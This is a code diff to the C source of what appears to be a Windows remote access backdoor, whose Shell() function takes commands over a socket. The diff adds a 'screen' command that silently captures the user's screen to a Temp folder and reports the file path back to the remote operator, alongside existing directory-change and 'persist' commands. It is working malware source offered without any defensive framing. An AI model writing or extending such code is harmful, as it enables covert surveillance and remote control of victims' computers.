@@ -1,6 +1,8 @@
 #include "status.h"
 #include "logger.h"
+#include "screen.h"
 #include "str_cut.h"
+
 #include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -106,7 +108,31 @@ void Shell()
       chdir(str);
 
       // Send response
-      send(sock, "Directory changed.", sizeof("Directory changed."), 0);
+      send(sock, "Directory changed.\n", sizeof("Directory changed."), 0);
+    }
+    else if (strncmp("screen", buffer, 6) == 0)
+    {
+      // Build base path for screens dir
+      char BASE_PATH[256]; // Allocate memory for BASE_PATH
+      sprintf(BASE_PATH, "C:\\Users\\%s\\AppData\\Local\\Temp\\screen", getenv("USERNAME"));
+
+      if (mkdir(BASE_PATH) != 0)
+      {
+      }
+
+      // Build new path for single screenshot
+      char *UUID = generate_uuid();
+      char SCREENSHOT_FILE[256]; // Allocate memory for SCREENSHOT_FILE
+      sprintf(SCREENSHOT_FILE, "%s\\%s.bmp", BASE_PATH, UUID);
+
+      // Capture screen
+      screenCapture(0, 0, 1920, 1080, SCREENSHOT_FILE);
+
+      char suc[128];
+      sprintf(suc, "[+] Screenshot saved to: %s\n", SCREENSHOT_FILE);
+
+      // Send back path of screenshot
+      send(sock, suc, sizeof(suc), 0);
     }
     else if (strncmp("persist", buffer, 7) == 0)
     {
